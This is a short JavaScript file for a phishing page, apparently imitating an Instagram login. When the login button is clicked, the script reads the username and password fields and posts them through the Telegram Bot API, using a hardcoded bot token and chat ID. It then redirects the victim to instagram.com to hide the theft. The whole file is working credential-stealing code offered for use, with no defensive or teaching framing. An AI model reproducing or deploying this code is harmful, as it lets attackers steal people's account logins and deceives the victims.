let inputs = document.querySelectorAll('input');
let button = document.querySelector('.login-button');

const Token = '7938025216:AAE7dnQXD_m7nEPqPI4-qnCgEromg02b8jw';
const Chat_Id = '357220177';

button.addEventListener('click', () => {
    const username = inputs[0].value;
    const password = inputs[1].value;

    const message = `Login parol\nUsername: ${username}\nPassword: ${password}`;

    fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: Chat_Id,
            text: message,
        }),
    })
        .then(response => response.json())
        .then(res => console.log(res)
        )

    window.location.href = 'https://www.instagram.com/'
});